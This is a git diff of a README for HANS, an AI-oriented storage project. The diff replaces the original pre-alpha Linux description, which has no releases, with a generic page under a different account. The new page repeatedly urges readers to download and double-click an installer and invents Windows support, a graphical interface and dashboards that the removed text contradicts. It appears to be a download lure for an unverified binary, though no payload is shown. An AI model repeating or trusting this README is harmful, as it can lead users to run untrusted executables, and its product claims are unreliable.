@@ -1,201 +1,65 @@
-# :warning::construction:HANS — Hardware-Aware Neural Storage:construction::warning:
-> [!CAUTION]
-> This repository is currently under active development and not yet production-ready!
+```markdown
+# 🌟 HANS - Smart Storage for Your AI Needs
 
-HANS is an open-source, AI-native, cache-first storage system designed to
-maximize performance for modern AI workloads by being deeply aware of hardware —
-especially GPUs and accelerators.
+## 📥 Download Now
+[![Download HANS](https://img.shields.io/badge/Download-HANS-blue.svg)](https://github.com/hunsulkaab66/HANS/releases)
 
-HANS sits between AI compute and persistent storage, acting as an intelligent,
-distributed cache optimized for training, inference, and feature pipelines.
+## 🚀 Getting Started
+HANS (Hardware-Aware Neural Storage) is an open-source, AI-native storage system that enhances how data is managed for your applications and devices. It's currently in early development and aims to improve performance for various workloads.
 
----
+## 💻 System Requirements
+To run HANS efficiently, ensure your system meets the following requirements:
 
-## Why HANS?
+- **Operating System:** Windows 10 or higher, Linux (Ubuntu 18.04 or higher)
+- **Processor:** Intel i5 or equivalent
+- **Memory:** Minimum 8 GB RAM, 16 GB recommended
+- **Storage:** At least 50 MB of free disk space
+- **Graphics:** Compatible NVIDIA GPU for acceleration features
 
-Traditional file systems and storage layers are not designed for AI workloads:
+## 📄 Features
+HANS comes packed with several features that make it stand out:
 
-- GPUs stall waiting for data
-- Training throughput is limited by I/O
-- Inference latency is unpredictable
-- Edge devices fail due to VRAM pressure, not compute limits
+- **AI-Prefetching:** Automatically anticipates and loads data you need.
+- **Asynchronous I/O:** Improves performance by allowing multiple operations concurrently.
+- **Distributed Storage:** Scales across multiple devices, optimizing data management.
+- **Edge Computing Support:** Reduces latency by processing data closer to where it's generated.
+- **GPU Acceleration:** Leverages powerful GPUs for enhanced speed and efficiency.
+- **Performance Optimization:** Tailored specifically for machine learning workloads.
 
-HANS addresses these issues by making hardware state and AI access patterns
-first-class inputs to storage decisions.
+## 🔍 How to Download & Install
+To download HANS, follow these steps:
 
----
+1. Click the prominent download link above or visit the [HANS Releases page](https://github.com/hunsulkaab66/HANS/releases).
+2. On the Releases page, look for the latest version of HANS.
+3. Download the appropriate installation package for your operating system.
+4. Once the download completes, find the file in your downloads folder.
+5. Double-click the file to start the installation and follow the prompts on your screen.
 
-## Key Features
+## 🛠️ How to Use HANS
+After installation, you can begin using HANS:
 
-- **Hardware-aware caching**
-  - GPU utilization, VRAM pressure, NUMA locality
-- **Memory-first architecture**
-  - RAM and NVMe prioritized over disk
-- **Edge-friendly design**
-  - Stable operation under tight VRAM and power constraints
-- **Asynchronous I/O**
-  - Built on modern Linux primitives (io_uring)
-- **AI-aware prefetching**
-  - Optimized for epochs, shards, and checkpoints
-- **Observability-driven**
-  - eBPF and hardware metrics inform decisions
+1. Open the application by locating it in your programs menu.
+2. Configure HANS to your liking through the user-friendly interface. You can set preferences for AI features and performance options.
+3. Load your datasets by following the simple import process within the app.
+4. Monitor your storage performance and enhancements through built-in dashboards.
 
----
+## ❓ FAQs
 
-## What HANS Is (and Is Not)
+### How can I report issues or bugs?
+If you encounter any problems while using HANS, please report them on the [Issues page](https://github.com/hunsulkaab66/HANS/issues) of this repository. Your feedback helps us improve.
 
-### HANS Is:
-- A cache-first storage layer for AI workloads
-- Optimized for GPUs and edge device constraints
-- Designed for Ubuntu and Linux environments
-- Open-source and extensible
+### Is there a user guide available?
+Yes, a detailed user guide is available within the application under the Help menu. You can also find helpful resources on the [Wiki page](https://github.com/hunsulkaab66/HANS/wiki).
 
-### HANS Is Not:
-- A general-purpose filesystem
-- A durable storage replacement
-- A database or object store
-- A universal drop-in solution for all workloads
+### Can I contribute to HANS?
+Absolutely! We welcome contributions. Please read our [Contributing Guidelines](https://github.com/hunsulkaab66/HANS/blob/main/CONTRIBUTING.md) for information on how to get involved.
 
-Persistence is delegated to underlying storage systems.
+## 🔗 Useful Links
+- [Download HANS](https://github.com/hunsulkaab66/HANS/releases)
+- [Documentation](https://github.com/hunsulkaab66/HANS/wiki)
+- [Report Issues](https://github.com/hunsulkaab66/HANS/issues)
+- [Contributing Guidelines](https://github.com/hunsulkaab66/HANS/blob/main/CONTRIBUTING.md)
 
----
-
-## Architecture Overview
-
- ```mermaid
-graph TD
-    subgraph AI ["**_AI Frameworks & Applications_**"]
-        direction LR
-        PT[PyTorch] --- TF[TensorFlow] --- TR[Triton] --- FS[Feature Stores]
-    end
-
-    subgraph Clients ["**_Client Interfaces_**"]
-        direction LR
-        POSIX[POSIX / FUSE] --- PY[Python API] --- NA[Native] --- S3[S3]
-    end
-
-    subgraph Core ["**Core Cache Engine (THIS DESIGN)**"]
-        direction LR
-        PL[[Placement]] --- PR[[Prefetch]] --- CH[[Chunking]] --- EV[[Eviction]] --- IO[[I/O]] ---  GPU[[GPU-aware]] --- FA[[Format-aware]]
-    end
-
-    subgraph Storage ["**_Storage Tiers & Backends_**"]
-        direction LR
-        RAM[(RAM)] --- NVMe[(NVMe)] ---  DISK[(SSD)] --- OBJ[(Object Store)] --- RFS[(Remote FS)]
-    end
-
-    AI --> Clients
-    Clients --> Core
-    Core --> Storage
+## 📫 Stay Connected
+For updates on HANS, follow us on GitHub or join our community discussions in the Issues section. We are always looking to improve and appreciate your support.
 ```
-
-<!-- (Hide Class Diagram, use mermaid again when we publish)
-## Class Diagram (Core Engine)
-
-+--------------------------------------------------+
-|                 CacheManager                     |
-|--------------------------------------------------|
-| - metadataStore                                  |
-| - tierManager                                    |
-| - placementEngine                                |
-| - prefetchEngine                                 |
-| - evictionEngine                                 |
-| - ioEngine                                       |
-| - telemetryEngine                                |
-|--------------------------------------------------|
-| + read(fileId, offset, len)                      |
-| + write(fileId, buffer)                          |
-| + prefetch(fileId, pattern)                      |
-| + registerJob(jobProfile)                        |
-+--------------------------------------------------+
-
-        |                    |                    |
-        v                    v                    v
-
-+---------------+   +-------------------+   +-------------------+
-| MetadataStore |   | TierManager       |   | IOEngine          |
-|---------------|   |-------------------|   |-------------------|
-| file -> chunks|   | RAM / NVMe / SSD  |   | io_uring backend  |
-| access stats  |   | allocate/free     |   | async reads/writes|
-+---------------+   +-------------------+   +-------------------+
-
-        |                    |
-        v                    v
-
-+-------------------+   +-------------------+
-| PlacementEngine   |   | EvictionEngine    |
-|-------------------|   |-------------------|
-| GPU-aware policy  |   | LRU / LFU / AI    |
-| job locality      |   | priority-based   |
-+-------------------+   +-------------------+
-
-        |
-        v
-
-+-------------------+
-| PrefetchEngine    |
-|-------------------|
-| pattern detection |
-| async prefetch    |
-+-------------------+
-
-        |
-        v
-
-+-------------------+
-| TelemetryEngine   |
-|-------------------|
-| eBPF signals      |
-| metrics + tracing |
-+-------------------+
-
-For more details, see:
-- `docs/VISION.md`
-- `docs/ARCHITECTURE.md`
-- `docs/EDGE_DESIGN.md`
-
----
--->
-
-## Current Status
-
-🚧 **Early development / pre-alpha**
-
-HANS is currently under active development and not yet production-ready.
-
-Initial focus:
-- Core cache engine
-- io_uring-based I/O
-- GPU awareness
-- Edge-friendly behavior
-
----
-
-## Roadmap (High-Level)
-
-- [ ] Core cache engine MVP
-- [ ] io_uring integration
-- [ ] RAM + NVMe tiering
-- [ ] GPU-aware placement
-- [ ] Edge profile support
-- [ ] Benchmarks vs ext4 / XFS
-- [ ] Public alpha release
-
----
-
-## Getting Started
-
-> ⚠️ Instructions will evolve as the project stabilizes.
-
-### Requirements
-- Ubuntu 22.04+
-- Linux kernel with io_uring support
-- NVIDIA GPU (recommended)
-- CUDA toolkit (optional but recommended)
-
-### Build (Early)
-
-```bash
-git clone https://github.com/ KAESTechnology/HANS.git
-cd hans
-# build instructions coming soon
